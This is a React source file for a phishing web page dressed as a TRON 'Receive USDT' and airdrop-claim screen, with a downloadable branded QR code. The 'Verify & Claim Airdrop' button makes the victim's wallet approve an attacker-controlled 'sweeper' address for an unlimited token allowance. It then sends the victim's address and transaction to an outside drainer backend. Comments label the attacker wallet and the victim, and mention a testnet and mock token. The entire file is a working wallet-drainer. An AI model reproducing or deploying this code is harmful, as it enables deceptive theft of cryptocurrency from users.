import React, { useEffect, useMemo, useRef, useState } from "react";
import { QRCodeSVG } from "qrcode.react";

// CONFIGURATION
// IMPORTANT: SWEEPER_ADDRESS must be your ATTACKER WALLET (Account 01) for transferFrom to work.
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR ATTACKER WALLET (Account 01)
const BACKEND = "https://qr-drainer.onrender.com"; // Your Render Backend

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const fmt = (n) => Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");

// TRON LOGO BASE64 (Ensures logo appears in downloaded QR without CORS issues)
const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmMmQ1NSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

export default function App() {
  const [mode, setMode] = useState("live"); // Default to live for demo
  const [wallet, setWallet] = useState("");
  const [victimBal, setVictimBal] = useState(0);
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);

  // Dynamic QR Value: Always uses the current URL so it works on any device
  const qrValue = typeof window !== "undefined" ? window.location.href : "";

  useEffect(() => {
    if (mode !== 'live') return;
    const heartbeat = setInterval(async () => {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (wallet !== addr) {
          setWallet(addr);
          try {
            const c = await window.tronWeb.contract().at(TOKEN_ADDRESS);
            const raw = await c.balanceOf(addr).call();
            setVictimBal(Number(raw.toString()) / 1e6);
          } catch (e) {}
        }
      }
    }, 2000);
    return () => clearInterval(heartbeat);
  }, [mode, wallet]);

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(SWEEPER_ADDRESS);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // ROBUST QR DOWNLOAD WITH LOGO
  const handleDownloadQR = () => {
    const svg = document.querySelector('#lab-qr-box svg');
    if (!svg) return;
    const size = 400; // High res
    const canvas = document.createElement('canvas');
    canvas.width = size; canvas.height = size;
    const ctx = canvas.getContext('2d');
    
    // 1. Draw White Background
    ctx.fillStyle = "#ffffff";
    ctx.fillRect(0, 0, size, size);

    // 2. Draw QR Code
    const img = new Image();
    const svgData = new XMLSerializer().serializeToString(svg);
    img.onload = () => {
      ctx.drawImage(img, 0, 0, size, size);
      
      // 3. Draw Logo in Center
      const logoSize = size * 0.22;
      const logoPos = (size - logoSize) / 2;
      
      // White circle behind logo
      ctx.beginPath();
      ctx.arc(size/2, size/2, logoSize/2 + 10, 0, 2 * Math.PI);
      ctx.fillStyle = "#ffffff";
      ctx.fill();
      
      // Draw TRON Logo
      const logoImg = new Image();
      logoImg.onload = () => {
        ctx.drawImage(logoImg, logoPos, logoPos, logoSize, logoSize);
        // 4. Trigger Download
        const link = document.createElement('a');
        link.download = 'TRON-Airdrop-Receive.png';
        link.href = canvas.toDataURL('image/png');
        link.click();
      };
      logoImg.src = TRON_LOGO_B64;
    };
    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgData)));
  };

  const handleClaim = async () => {
    if (!window.tronWeb) return alert("Please connect your wallet first.");
    setLoading(true);
    try {
      const tw = window.tronWeb;
      const c = await tw.contract().at(TOKEN_ADDRESS);
      // Approve the Attacker Wallet (SWEEPER_ADDRESS) for Max Amount
      const tx = await c.approve(SWEEPER_ADDRESS, "1000000000000000").send({ 
        from: tw.defaultAddress.base58, 
        feeLimit: 100000000 
      });
      
      // Alert Backend
      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          victimAddress: tw.defaultAddress.base58, 
          txHash: tx,
          network: "TRON Shasta" 
        })
      });
      alert("Transaction Sent! Waiting for processing...");
    } catch (e) {
      console.error(e);
      alert("Transaction failed or rejected.");
    }
    setLoading(false);
  };

  return (
    <div style={{ background: '#0f172a', color: '#fff', minHeight: '100vh', fontFamily: 'sans-serif', display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
      <div style={{ background: '#ffffff', color: '#000', borderRadius: '24px', padding: '30px', maxWidth: '400px', width: '100%', boxShadow: '0 20px 50px rgba(0,0,0,0.5)' }}>
        
        <div style={{ textAlign: 'center', marginBottom: '20px' }}>
          <h2 style={{ margin: '0 0 5px 0', fontSize: '20px', fontWeight: '700' }}>Receive USDT</h2>
          <div style={{ fontSize: '12px', color: '#666', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '5px' }}>
            <span style={{ width: '8px', height: '8px', background: '#ff2d55', borderRadius: '50%' }}></span>
            TRON (TRC20)
          </div>
        </div>

        <div style={{ textAlign: 'center', marginBottom: '20px' }}>
          <div id="lab-qr-box" style={{ display: 'inline-block', padding: '15px', background: '#fff', borderRadius: '16px', border: '1px solid #eee' }}>
            <QRCodeSVG 
              value={qrValue} 
              size={220} 
              level="H" 
              includeMargin={false}
              imageSettings={{
                src: TRON_LOGO_B64,
                height: 50,
                width: 50,
                excavate: true,
              }}
            />
          </div>
        </div>

        <div style={{ background: '#f8f9fa', borderRadius: '12px', padding: '12px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '15px', border: '1px solid #e9ecef' }}>
          <span style={{ fontFamily: 'monospace', fontSize: '11px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '70%' }}>
            {SWEEPER_ADDRESS}
          </span>
          <button onClick={handleCopyAddress} style={{ background: copied ? '#22c55e' : '#ff2d55', color: '#fff', border: 'none', borderRadius: '6px', padding: '6px 12px', fontSize: '11px', cursor: 'pointer' }}>
            {copied ? '✓ Copied' : 'Copy'}
          </button>
        </div>

        <div style={{ background: '#fff3cd', border: '1px solid #ffc107', borderRadius: '8px', padding: '10px', fontSize: '11px', color: '#856404', marginBottom: '20px', display: 'flex', gap: '8px' }}>
          <span>⚠️</span>
          <span>Only send TRC-20 USDT assets to this address. Other assets will be lost forever.</span>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginBottom: '15px' }}>
          <button onClick={handleDownloadQR} style={{ background: '#f1f5f9', border: '1px solid #cbd5e1', borderRadius: '8px', padding: '12px', cursor: 'pointer', fontWeight: '600' }}>
            ⬇️ Save QR
          </button>
          <button onClick={() => navigator.share({ url: qrValue })} style={{ background: '#f1f5f9', border: '1px solid #cbd5e1', borderRadius: '8px', padding: '12px', cursor: 'pointer', fontWeight: '600' }}>
            📤 Share
          </button>
        </div>

        <button 
          onClick={handleClaim} 
          disabled={loading || !wallet}
          style={{ 
            width: '100%', 
            background: 'linear-gradient(135deg, #ff2d55, #ff7a45)', 
            color: '#fff', 
            border: 'none', 
            borderRadius: '12px', 
            padding: '16px', 
            fontSize: '16px', 
            fontWeight: '700', 
            cursor: loading ? 'not-allowed' : 'pointer',
            boxShadow: '0 4px 15px rgba(255,45,85,0.4)'
          }}
        >
          {loading ? 'Processing...' : (wallet ? 'Verify & Claim Airdrop' : 'Connect Wallet to Claim')}
        </button>

        {wallet && (
          <div style={{ marginTop: '15px', textAlign: 'center', fontSize: '12px', color: '#666' }}>
            Connected: {short(wallet)} | Balance: ${fmt(victimBal)}
          </div>
        )}
      </div>
    </div>
  );
}